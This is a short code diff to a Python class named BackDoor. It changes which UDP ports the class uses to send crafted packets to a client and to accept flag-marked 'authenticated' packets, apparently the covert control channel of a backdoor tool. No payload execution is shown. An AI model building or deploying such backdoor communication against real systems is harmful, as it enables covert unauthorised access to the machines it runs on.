@@ -180,7 +180,7 @@ class BackDoor:
 
     def craft_packet(self, msg: str):
         ip = IP(dst=self.client)
-        udp = UDP(sport=RandShort(), dport=self.client_port)
+        udp = UDP(sport=RandShort(), dport=self.send_port)
         payload = msg
         pkt = ip / udp / payload
         try:
@@ -233,7 +233,7 @@ class BackDoor:
         try:
             msg = packet[UDP].load.decode()
             if UDP in packet and msg.startswith(self.flag_begin) \
-                    and msg.endswith(self.flag_close) and packet[UDP].dport == self.port:
+                    and msg.endswith(self.flag_close) and packet[UDP].dport == self.recv_port:
                 print(f"Received authenticated packet: {msg}")
                 if not self.client:
                     self.set_client(packet[IP].src)
